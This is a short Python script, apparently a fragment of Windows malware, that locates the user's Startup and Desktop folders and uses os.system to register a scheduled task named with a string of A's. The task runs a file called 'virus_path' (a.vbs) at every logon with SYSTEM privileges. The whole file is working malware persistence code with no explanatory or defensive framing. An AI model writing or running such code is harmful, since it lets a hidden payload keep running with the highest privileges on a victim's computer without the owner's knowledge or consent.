import os
import getpass

cwd = os.getcwd()
user = getpass.getuser()
c_path = "C:\\Users\\" + user + "\\"
startup_path = c_path + "AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
desktop_path = c_path + "Desktop\\"
virus_path = cwd + "\\a.vbs"
passpath = f"""cmd /c "schtasks.exe /create /tn "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" /sc onlogon /ru system /tr {virus_path}" """
os.system(passpath)
